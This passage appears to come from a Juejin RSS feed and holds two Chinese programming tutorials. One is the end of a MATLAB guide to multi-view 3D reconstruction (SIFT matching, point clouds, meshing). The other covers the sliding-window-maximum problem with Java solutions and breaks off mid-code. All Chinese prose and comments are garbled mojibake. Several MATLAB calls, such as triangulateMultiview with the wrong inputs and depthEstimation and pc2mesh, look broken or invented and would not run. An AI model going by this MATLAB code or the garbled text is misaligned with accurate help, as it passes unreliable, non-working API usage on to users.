recon_img_files = {<span class="hljs-string">'img1.jpg'</span>,<span class="hljs-string">'img2.jpg'</span>,<span class="hljs-string">'img3.jpg'</span>,<span class="hljs-string">'img4.jpg'</span>,<span class="hljs-string">'img5.jpg'</span>};
recon_imgs = <span class="hljs-built_in">cellfun</span>(@imread, recon_img_files, <span class="hljs-string">'UniformOutput'</span>, <span class="hljs-built_in">false</span>);

<span class="hljs-comment">% 2. æå–æ‰€æœ‰å›¾åƒçš„SIFTç‰¹å¾ç‚¹å’Œæè¿°å­</span>
num_imgs = <span class="hljs-built_in">length</span>(recon_imgs);
points = cell(<span class="hljs-number">1</span>, num_imgs);   <span class="hljs-comment">% å­˜å‚¨ç‰¹å¾ç‚¹</span>
features = cell(<span class="hljs-number">1</span>, num_imgs); <span class="hljs-comment">% å­˜å‚¨ç‰¹å¾æè¿°å­</span>

<span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span>:num_imgs
    gray_img = rgb2gray(recon_imgs{<span class="hljs-built_in">i</span>});
    <span class="hljs-comment">% æ£€æµ‹SIFTç‰¹å¾ç‚¹</span>
    pts = detectSIFTFeatures(gray_img);
    <span class="hljs-comment">% æå–ç‰¹å¾æè¿°å­ï¼ˆç­›é€‰æœ‰æ•ˆç‰¹å¾ç‚¹ï¼‰</span>
    [feat, valid_pts] = extractFeatures(gray_img, pts);
    points{<span class="hljs-built_in">i</span>} = valid_pts;
    features{<span class="hljs-built_in">i</span>} = feat;
<span class="hljs-keyword">end</span>

<span class="hljs-comment">% 3. å¤šè§†å›¾ç‰¹å¾åŒ¹é…ï¼ˆåŒ¹é…ç›¸é‚»å›¾åƒçš„ç‰¹å¾ï¼‰</span>
matches = cell(num_imgs<span class="hljs-number">-1</span>, <span class="hljs-number">1</span>);
<span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span>:num_imgs<span class="hljs-number">-1</span>
    <span class="hljs-comment">% æœ€è¿‘é‚»åŒ¹é…ï¼ŒMaxRatio=0.7å‡å°‘è¯¯åŒ¹é…</span>
    idx_pairs = matchFeatures(features{<span class="hljs-built_in">i</span>}, features{<span class="hljs-built_in">i</span>+<span class="hljs-number">1</span>}, <span class="hljs-string">'MaxRatio'</span>, <span class="hljs-number">0.7</span>);
    matches{<span class="hljs-built_in">i</span>} = idx_pairs;
<span class="hljs-keyword">end</span>
</code></pre>
<h3 data-id="heading-3">å››ã€æ­¥éª¤3ï¼šä¸‰ç»´ç‚¹äº‘ç”Ÿæˆï¼ˆç¨€ç–â†’ç¨ å¯†ï¼‰</h3>
<h4 data-id="heading-4">1. ç¨€ç–ç‚¹äº‘ï¼ˆå¿«é€Ÿé¢„è§ˆï¼Œä»…å«ç‰¹å¾ç‚¹ï¼‰</h4>
<pre><code class="hljs language-matlab" lang="matlab"><span class="hljs-comment">% åŸºäºæ ‡å®šå‚æ•°å’ŒåŒ¹é…ç‰¹å¾ï¼Œä¸‰è§’åŒ–ç”Ÿæˆç¨€ç–ç‚¹äº‘</span>
[sparse_point3D, ~, ~] = triangulateMultiview(points, features, cam_params);

<span class="hljs-comment">% å¯è§†åŒ–ç¨€ç–ç‚¹äº‘</span>
<span class="hljs-built_in">figure</span>; pcshow(sparse_point3D);
xlabel(<span class="hljs-string">'X (mm)'</span>); ylabel(<span class="hljs-string">'Y (mm)'</span>); zlabel(<span class="hljs-string">'Z (mm)'</span>);
title(<span class="hljs-string">'ç¨€ç–ä¸‰ç»´ç‚¹äº‘'</span>);
grid on; axis equal;
</code></pre>
<h4 data-id="heading-5">2. ç¨ å¯†ç‚¹äº‘ï¼ˆé«˜ç²¾åº¦ï¼Œè¦†ç›–å®Œæ•´åœºæ™¯ï¼‰</h4>
<p>ç¨€ç–ç‚¹äº‘ä»…åŒ…å«ç‰¹å¾ç‚¹ï¼Œç¨ å¯†ç‚¹äº‘éœ€é€šè¿‡æ·±åº¦ä¼°è®¡è¡¥å…¨æ‰€æœ‰åƒç´ çš„ä¸‰ç»´ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-matlab" lang="matlab"><span class="hljs-comment">% 1. ä»¥ç¬¬ä¸€å¼ å›¾åƒä¸ºå‚è€ƒï¼Œç”Ÿæˆæ·±åº¦å›¾</span>
ref_gray = rgb2gray(recon_imgs{<span class="hljs-number">1</span>});
depth_map = depthEstimation(ref_gray, recon_imgs{<span class="hljs-number">2</span>:<span class="hljs-keyword">end</span>}, cam_params);

<span class="hljs-comment">% 2. ä»æ·±åº¦å›¾ç”Ÿæˆç¨ å¯†ç‚¹äº‘</span>
dense_cloud = reconstructScene(depth_map, cam_params.CameraParameters{<span class="hljs-number">1</span>});

<span class="hljs-comment">% 3. ç‚¹äº‘æ»¤æ³¢ï¼ˆå»é™¤ç¦»ç¾¤ç‚¹ï¼Œæå‡è´¨é‡ï¼‰</span>
dense_cloud_filtered = pcdenoise(dense_cloud, <span class="hljs-string">'NumNeighbors'</span>, <span class="hljs-number">20</span>);

<span class="hljs-comment">% 4. å¯è§†åŒ–ç¨ å¯†ç‚¹äº‘</span>
<span class="hljs-built_in">figure</span>; pcshow(dense_cloud_filtered);
title(<span class="hljs-string">'æ»¤æ³¢åç¨ å¯†ä¸‰ç»´ç‚¹äº‘'</span>);
xlabel(<span class="hljs-string">'X (mm)'</span>); ylabel(<span class="hljs-string">'Y (mm)'</span>); zlabel(<span class="hljs-string">'Z (mm)'</span>);
grid on; axis equal;
</code></pre>
<h3 data-id="heading-6">äº”ã€æ­¥éª¤4ï¼šç½‘æ ¼é‡å»ºä¸ä¸‰ç»´æ¨¡å‹å¯è§†åŒ–</h3>
<p>ç¨ å¯†ç‚¹äº‘å¯è¿›ä¸€æ­¥é‡å»ºä¸ºä¸‰è§’ç½‘æ ¼æ¨¡å‹ï¼Œä¾¿äº3Dæ‰“å°ã€æ¸²æŸ“ç­‰åº”ç”¨ï¼š</p>
<pre><code class="hljs language-matlab" lang="matlab"><span class="hljs-comment">% 1. ç‚¹äº‘ä¸‹é‡‡æ ·ï¼ˆå‡å°‘è®¡ç®—é‡ï¼Œç½‘æ ¼å°ºå¯¸2mmï¼‰</span>
downsampled_cloud = pcdownsample(dense_cloud_filtered, <span class="hljs-string">'gridAverage'</span>, <span class="hljs-number">2</span>);

<span class="hljs-comment">% 2. é‡å»ºä¸‰è§’ç½‘æ ¼ï¼ˆé‚»åŸŸæœç´¢åŠå¾„5mmï¼Œå¯æ ¹æ®åœºæ™¯è°ƒæ•´ï¼‰</span>
[faces, vertices] = pc2mesh(downsampled_cloud, <span class="hljs-number">5</span>);

<span class="hljs-comment">% 3. å¯è§†åŒ–ç½‘æ ¼æ¨¡å‹</span>
<span class="hljs-built_in">figure</span>; 
trisurf(faces, vertices(:,<span class="hljs-number">1</span>), vertices(:,<span class="hljs-number">2</span>), vertices(:,<span class="hljs-number">3</span>), ...
    <span class="hljs-string">'FaceColor'</span>, <span class="hljs-string">'cyan'</span>, <span class="hljs-string">'EdgeColor'</span>, <span class="hljs-string">'none'</span>);
axis equal; view(<span class="hljs-number">3</span>);
xlabel(<span class="hljs-string">'X (mm)'</span>); ylabel(<span class="hljs-string">'Y (mm)'</span>); zlabel(<span class="hljs-string">'Z (mm)'</span>);
title(<span class="hljs-string">'æœ€ç»ˆä¸‰ç»´ç½‘æ ¼æ¨¡å‹'</span>);
grid on;
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰‘æŒ‡offer-64ã€æ»‘åŠ¨çª—â¼çš„æœ€â¼¤å€¼]]></title>    <link>https://juejin.cn/post/7595096774547030025</link>    <guid>https://juejin.cn/post/7595096774547030025</guid>    <pubDate>2026-01-15T00:09:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595096774547030025" data-draft-id="7593713738856382502" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰‘æŒ‡offer-64ã€æ»‘åŠ¨çª—â¼çš„æœ€â¼¤å€¼"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2026-01-15T00:09:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SevenCoding"/> <meta itemprop="url" content="https://juejin.cn/user/3261615728242467"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰‘æŒ‡offer-64ã€æ»‘åŠ¨çª—â¼çš„æœ€â¼¤å€¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3261615728242467/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SevenCoding
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T00:09:52.000Z" title="Thu Jan 15 2026 00:09:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">é¢˜â½¬æè¿°</h2>
<p>ç»™å®šâ¼€ä¸ªæ•°ç»„å’Œæ»‘åŠ¨çª—â¼çš„â¼¤â¼©ï¼Œæ‰¾å‡ºæ‰€æœ‰æ»‘åŠ¨çª—â¼â¾¥æ•°å€¼çš„æœ€â¼¤å€¼ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè¾“â¼Šæ•°ç»„ {2,3,4,2,6,2,5,1} åŠæ»‘åŠ¨çª—â¼çš„â¼¤â¼© 3 ï¼Œé‚£ä¹ˆâ¼€å…±å­˜åœ¨ 6 ä¸ªæ»‘åŠ¨çª—â¼ï¼Œä»–ä»¬çš„æœ€â¼¤å€¼åˆ†åˆ«ä¸º {4,4,6,6,6,5} ï¼›</p>
<p>é’ˆå¯¹æ•°ç»„ {2,3,4,2,6,2,5,1} çš„æ»‘åŠ¨çª—â¼æœ‰ä»¥ä¸‹6ä¸ªï¼š {[2,3,4],2,6,2,5,1} ï¼Œ {2,[3,4,2],6,2,5,1} ï¼Œ {2,3,[4,2,6],2,5,1} ï¼Œ {2,3,4, [2,6,2],5,1} ï¼Œ {2,3,4,2,[6,2,5],1} ï¼Œ {2,3,4,2,6,[2,5,1]} ã€‚ çª—â¼â¼¤äºæ•°ç»„â»“åº¦çš„æ—¶å€™ï¼Œè¿”å›ç©ºã€‚</p>
<h2 data-id="heading-1">æ€è·¯åŠè§£ç­”</h2>
<h3 data-id="heading-2">æš´åŠ›æ³•</h3>
<p>éå†æ¯ä¸ªå¯èƒ½çš„çª—å£èµ·å§‹ä½ç½®ï¼Œè®¡ç®—çª—å£å†…çš„æœ€å¤§å€¼</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] maxSlidingWindow(<span class="hljs-type">int</span>[] nums, <span class="hljs-type">int</span> k) {
        <span class="hljs-comment">// å¤„ç†è¾¹ç•Œæƒ…å†µ</span>
        <span class="hljs-keyword">if</span> (nums == <span class="hljs-literal">null</span> || nums.length == <span class="hljs-number">0</span> || k &lt;= <span class="hljs-number">0</span> || k &gt; nums.length) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">0</span>];
        }
        
        <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> nums.length;
        <span class="hljs-type">int</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[n - k + <span class="hljs-number">1</span>]; <span class="hljs-comment">// ç»“æœæ•°ç»„</span>
        
        <span class="hljs-comment">// éå†æ¯ä¸ªçª—å£çš„èµ·å§‹ä½ç½®</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt;= n - k; i++) {
            <span class="hljs-type">int</span> <span class="hljs-variable">max</span> <span class="hljs-operator">=</span> Integer.MIN_VALUE;
            
            <span class="hljs-comment">// è®¡ç®—å½“å‰çª—å£å†…çš„æœ€å¤§å€¼</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> i; j &lt; i + k; j++) {
                <span class="hljs-keyword">if</span> (nums[j] &gt; max) {
                    max = nums[j];
                }
            }
            result[i] = max;
        }
        
        <span class="hljs-keyword">return</span> result;
    }
}
</code></pre>
<ul>
<li><strong>æ—¶é—´å¤æ‚åº¦</strong>ï¼šO(nÃ—k)ï¼Œéœ€è¦å¤„ç†n-k+1ä¸ªçª—å£ï¼Œæ¯ä¸ªçª—å£éœ€è¦kæ¬¡æ¯”è¾ƒ</li>
<li><strong>ç©ºé—´å¤æ‚åº¦</strong>ï¼šO(1)ï¼Œé™¤ç»“æœæ•°ç»„å¤–åªä½¿ç”¨å¸¸æ•°ç©ºé—´</li>
</ul>
<h3 data-id="heading-3">åŒç«¯é˜Ÿåˆ—æ³•ï¼ˆæœ€ä¼˜è§£ï¼‰</h3>
<p>â¾¸å…ˆè¿›â¾â¾®ç©ºåˆ¤æ–­ï¼Œä»¥åŠæ•°ç»„â»“åº¦æ˜¯å¦ä¸ä¸º 0 ï¼Œæ˜¯å¦ä¸â¼©äºçª—â¼â»“åº¦ã€‚</p>
<p>å…¶æ¬¡ï¼Œä½¿â½¤â¼€ä¸ªåŒå‘é“¾è¡¨ï¼Œâ¾¥â¾¯ä¿å­˜çš„æ˜¯ç´¢å¼•ï¼Œéå†æ¯â¼€ä¸ªå…ƒç´ ï¼Œå¦‚æœåŒå‘é˜Ÿåˆ—ä¸ä¸ºç©ºä¸”æœ€åçš„å…ƒç´ ä½œä¸ºç´¢å¼•çš„æ•°å€¼â¼©äºå½“å‰çš„å…ƒç´ ï¼Œå°±æŠŠå½“å‰çš„å…ƒç´ çš„ç´¢å¼•åŠ åˆ°é˜Ÿåˆ—çš„åâ¾¯ã€‚ï¼ˆè¿™æ ·å¯ä»¥ä¿è¯é˜Ÿåˆ—ä»å¤´åˆ°å°¾æ˜¯å•è°ƒé€’å‡çš„ï¼Œä¹Ÿå°±æ˜¯é˜Ÿå°¾çš„å…ƒç´ å°±æ˜¯æœ€â¼©çš„å…ƒç´ ï¼‰ã€‚</p>
<p>ç„¶åæŠŠå½“å‰çš„å…ƒç´ åŠ è¿›å»é˜Ÿåˆ—å°¾éƒ¨ã€‚åˆ¤æ–­é˜Ÿåˆ—å‰â¾¯çš„å…ƒç´ æ˜¯ä¸æ˜¯ç´¢å¼•ä½ç½®ä¸ç¬¦åˆï¼Œå¦‚æœä¸ç¬¦åˆï¼Œå°±ç§»é™¤é˜Ÿåˆ—å¤´éƒ¨çš„å…ƒç´ ã€‚</p>
<p>é‚£ä¹ˆæ­¤æ—¶çš„é˜Ÿåˆ—â¾¸éƒ¨è‚¯å®šå°±æ˜¯æ»‘åŠ¨çª—â¼çš„æœ€â¼¤å€¼ã€‚ï¼ˆæ­¤å¤„åº”è¯¥åˆ¤æ–­æ»‘åŠ¨çª—â¼â½£æ•ˆçš„ç´¢å¼•ï¼‰</p>
<p>ä»¥ 2, 3, 4, 2, 6, 2, 5, 1 ä¸ºä¾‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/41882d174a5b4e68a36102f5939119d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2V2ZW5Db2Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769040592&amp;x-signature=j%2BWmVczSk4ow4I%2FLhVclj249cs8%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9bf6ae3181674669bc711025088cbe3f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2V2ZW5Db2Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769040592&amp;x-signature=Xeg%2BWCh4qFxh8Z%2FWxdRU%2BhqYsl0%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a26bbfd9d4f9410dafad961fc10b8eca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2V2ZW5Db2Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769040592&amp;x-signature=17JYyFDc%2Bo1P%2BvUwH6SiWHWcSOI%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0831549263ce4af3ba343891cc5f0e3f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2V2ZW5Db2Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769040592&amp;x-signature=My2lMSMf1zBHlztt16i2eFQoEag%3D" alt="" loading="lazy"/></p>
<p>æ‰€æœ‰çš„çª—â¼æœ€â¼¤å€¼â¾„æ­¤å·²ç»æ”¶é›†å®Œæˆã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution64</span> {
     <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
         <span class="hljs-type">int</span>[] nums = {<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>};
         System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Solution64</span>().maxInWindows(nums, <span class="hljs-number">3</span>));
     }
    
     <span class="hljs-keyword">public</span> ArrayList&lt;Integer&gt; <span class="hljs-title function_">maxInWindows</span><span class="hljs-params">(<span class="hljs-type">int</span>[] num, <span class="hljs-type">int</span> size)</span> {
         ArrayList&lt;Integer&gt; results = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
         <span class="hljs-keyword">if</span> (num == <span class="hljs-literal">null</span> || num.length == <span class="hljs-number">0</span> || num.length &lt; size || size &lt;= <span class="hljs-number">0</span>) {
         	<span class="hljs-keyword">return</span> results;
         }
         
         LinkedList&lt;Integer&gt; integers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();
         <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; num.length; i++) {
             <span class="hljs-keyword">while</span> (!integers.isEmpty() &amp;&amp; num[integers.peekLast()] &lt; num[i]) {
             	integers.removeLast();
             }
             integers.addLast(i);
             <span class="hljs-keyword">while</span> (i - integers.peekFirst() &gt;= size) {
             	integers.removeFirst();
             }
             <span class="hljs-keyword">if</span> (i &gt;= size - <span class="hljs-number">1</span>) {
             	results.add(num[integers.peekFirst()]);
             }
         }
         <span class="hljs-keyword">return</span> results;
     }
}
</code></pre>
<ul>
<li>æ—¶é—´å¤æ‚åº¦ï¼šOï¼ˆnï¼‰,æ‰€æœ‰çš„å…ƒç´ éƒ½è¿›â¼Šé˜Ÿåˆ—ï¼Œå†å‡ºé˜Ÿåˆ—</li>
<li>ç©ºé—´å¤æ‚åº¦ï¼šO(n)ï¼Œä½¿â½¤é¢å¤–çš„é˜Ÿåˆ—ç©ºé—´å­˜å‚¨ç´¢å¼•ä»¥åŠçª—â¼æœ€â¼¤å€¼ã€‚</li>
</ul>
<h3 data-id="heading-4">åŠ¨æ€è§„åˆ’æ³•ï¼ˆåˆ†å—æ€æƒ³ï¼‰</h3>
<p>å°†æ•°ç»„åˆ†æˆå¤§å°ä¸ºkçš„å—ï¼Œé¢„å¤„ç†æ¯ä¸ªä½ç½®çš„å·¦å³æœ€å¤§å€¼</p>
<p><strong>åˆ†å—æ€æƒ³ï¼š</strong></p>
<ul>
<li>å°†æ•°ç»„åˆ’åˆ†ä¸ºå¤§å°ä¸ºkçš„å—ï¼ˆæœ€åä¸€å—å¯èƒ½ä¸æ»¡ï¼‰</li>
<li><code>left[i]</code>ï¼šä»å½“å‰å—å¼€å§‹åˆ°ä½ç½®içš„æœ€å¤§å€¼</li>
<li><code>right[i]</code>ï¼šä»ä½ç½®iåˆ°å½“å‰å—ç»“æŸçš„æœ€å¤§å€¼</li>
</ul>
<p><strong>çª—å£æœ€å¤§å€¼è®¡ç®—ï¼š</strong></p>
<p>å¯¹äºçª—å£[i, i+k-1]ï¼š</p>
<ul>
<li>å¦‚æœçª—å£å®Œå…¨åœ¨ä¸€ä¸ªå—å†…ï¼š<code>right[i]</code>æˆ–<code>left[i+k-1]</code>å°±æ˜¯æœ€å¤§å€¼</li>
<li>å¦‚æœçª—å£è·¨è¶Šä¸¤ä¸ªå—ï¼šæœ€å¤§å€¼ = max(å³å—çš„å·¦æœ€å¤§å€¼, å·¦å—çš„å³æœ€å¤§å€¼)</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] maxSlidingWindow(<span class="hljs-type">int</span>[] nums, <span class="hljs-type">int</span> k) {
        <span class="hljs-keyword">if</span> (nums == <span class="hljs-literal">null</span> || nums.length == <span class="hljs-number">0</span> || k &lt;= <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">0</span>];
        }
        
        <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> nums.length;
        <span class="hljs-keyword">if</span> (k == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> nums; <span class="hljs-comment">// çª—å£å¤§å°ä¸º1ï¼Œç›´æ¥è¿”å›åŸæ•°ç»„</span>
        
        <span class="hljs-type">int</span>[] left = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[n];  <span class="hljs-comment">// ä»å·¦åˆ°å³çš„å—æœ€å¤§å€¼</span>
        <span class="hljs-type">int</span>[] right = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[n]; <span class="hljs-comment">// ä»å³åˆ°å·¦çš„å—æœ€å¤§å€¼</span>
        <span class="hljs-type">int</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[n - k + <span class="hljs-number">1</span>];
        
        <span class="hljs-comment">// æ„å»ºleftæ•°ç»„ï¼šä»å·¦åˆ°å³çš„å—å†…æœ€å¤§å€¼</span>
        left[<span class="hljs-number">0</span>] = nums[<span class="hljs-number">0</span>];
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; n; i++) {
            <span class="hljs-keyword">if</span> (i % k == <span class="hljs-number">0</span>) {
                <span class="hljs-comment">// å—çš„é¦–å…ƒç´ ï¼Œé‡æ–°å¼€å§‹è®¡ç®—</span>
                left[i] = nums[i];
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// ä¸å‰ä¸€ä¸ªä½ç½®æ¯”è¾ƒå–æœ€å¤§å€¼</span>
                left[i] = Math.max(left[i - <span class="hljs-number">1</span>], nums[i]);
            }
        }
        
